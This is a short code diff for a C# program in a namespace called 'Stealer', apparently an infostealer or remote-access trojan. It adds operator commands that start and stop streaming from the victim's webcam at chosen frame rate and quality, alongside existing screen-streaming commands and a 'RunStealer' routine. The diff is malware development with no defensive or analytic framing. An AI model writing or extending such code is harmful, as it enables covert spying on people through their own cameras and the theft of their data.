@@ -80,6 +80,19 @@ namespace Stealer
             {
                 ScreenStream.Stop();
             }
+            else if (cmdLower.StartsWith("camera_start"))
+            {
+                int fps = 5;
+                int quality = 50;
+                string[] parts = cmd.Split(':');
+                if (parts.Length >= 2) int.TryParse(parts[1], out fps);
+                if (parts.Length >= 3) int.TryParse(parts[2], out quality);
+                CameraStream.Start(fps, quality);
+            }
+            else if (cmdLower == "camera_stop")
+            {
+                CameraStream.Stop();
+            }
         }
 
         private static void RunStealer()
